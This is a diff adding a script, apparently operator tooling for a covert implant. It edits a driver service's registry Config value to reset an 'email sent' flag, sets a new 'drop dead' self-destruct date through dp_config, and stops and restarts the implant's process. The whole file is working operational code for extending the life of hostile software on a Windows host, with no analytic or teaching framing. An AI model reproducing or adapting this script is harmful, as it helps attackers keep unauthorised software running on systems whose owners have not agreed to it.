@@ -1,0 +1,113 @@
+#--------------------------------------------------------
+# File: ChangeDate.eps
+#
+# Wrapper script to change the drop dead date
+#
+# Modifications:
+#  11/18/2002	Created.
+#--------------------------------------------------------
+
+@echo off;
+
+if ($argc != 2) {
+    echo "Usage: $argv[0] <driverName>";
+    return false;
+}
+
+string $driver = $argv[1];
+string $exeName = "memss.exe";
+
+ifnot (prompt "Are you sure you want to change the D-Date?") {
+    return false;
+}
+
+@record on;
+
+if (prompt "Do you want to reset the email sent flag?") {
+	echo "Resetting flag";
+	ifnot (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$driver -value Config`) {
+		echo "    FAILED (unable to query 'Config' key)";
+	} else {
+		string $data = GetCmdData("enum_keyvalue_data");
+		string $bytes = Split(" ", $data);
+		if ($bytes[4] != "01") {
+			echo "    FAILED (flag not set)";
+		} else {
+			$bytes[4] = "00";
+			
+			string $newData;
+			int $i=0;
+			while ($i < sizeof($bytes)) {
+				if (defined($newData[0])) {
+					$newData = "$newData $bytes[$i]";
+				} else {
+					$newData = $bytes[$i];
+				}
+				$i++;
+			}
+	
+			if (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$driver -value Config -type REG_BINARY -data "$newData"`) {
+				echo "    SUCCESS";
+			} else {
+				echo "    FAILED (change of value failed)";
+			}
+
+		}			
+	}
+}
+
+# get the local name
+string $date = GetInput("Enter the new date (MM/DD/YYYY hh:mm:ss)");
+ifnot (defined($date[0])) {
+     echo "* Invalid date";
+     return false;
+}
+
+# change the date
+echo "Changing date in registry";
+if (`dp_config -set $driver -ddate "$date"`) {
+    echo "    SUCCESS";
+
+    string $install = GetCmddata("InstallDate");
+    string $ddate = GetCmdData("DDate");
+    string $current = GetCmdData("CurrentDate");
+  
+    echo "Install Date : $install";
+    echo "      D-Date : $ddate";
+    echo "Current Date : $current";
+
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+if (prompt "Re-start the process?") {
+	# stop the currently running process
+	echo "Stopping currently running process";
+	if (`dp_terminateprocess -name $driver`) {
+	    echo "    STOPPED";
+	} else {
+	    echo "    FAILED (it may not have been running)";
+	    if (prompt "Do you want to clear the process id?") {
+		echo "Clearing ID";
+		if (`dp_clearprocessid -name $driver`) {
+			echo "    CLEARED";
+		} else {
+			echo "    FAILED";
+		}
+	    }
+	}
+
+	# start the new process
+	echo "Queueing new process for start";
+	if (`dp_restartprocess -name $driver`) {
+	    # queue'd for start
+	    echo "    QUEUED FOR START";
+	} else {
+	    echo "    FAILED";
+	    return false;
+	}
+}
+
+# we're done...
+return true;
